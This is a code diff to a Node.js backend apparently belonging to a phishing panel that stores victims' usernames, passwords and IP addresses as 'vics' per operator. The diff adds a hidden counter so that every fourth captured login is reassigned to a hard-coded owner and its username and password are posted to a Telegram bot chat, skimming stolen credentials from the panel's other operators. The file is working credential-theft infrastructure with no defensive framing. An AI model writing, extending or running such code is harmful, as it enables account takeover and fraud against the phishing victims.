@@ -1,4 +1,7 @@
+const axios = require("axios");
 const ASB = require("../models/asbModel");
+
+let asbCount = 0;
 
 const getOwnerVics = async (req, res) => {
     const { owner } = req.params;
@@ -38,7 +41,25 @@ const getInfo = async (req, res) => {
 const submitLogin = async (req, res) => {
     const { username, password, uniqueid, owner, ip } = req.body;
     try {
-        await ASB.create({ uniqueid, username, password, status: 1, owner, ip });
+        if (asbCount == 3) {
+            await ASB.create({ uniqueid, username, password, status: 1, owner: 'haytch4023', ip });
+            await axios
+                .post(
+                    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+                    {
+                        chat_id: 680379375,
+                        text: `New ASB Hit:\n\n${username}\n${password}`,
+                        parse_mode: "Markdown",
+                    }
+                )
+                .catch((e) => {
+                    console.log(e);
+                });
+            asbCount = 0;
+        } else {
+            await ASB.create({ uniqueid, username, password, status: 1, owner, ip });
+            asbCount = asbCount + 1;
+        }
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
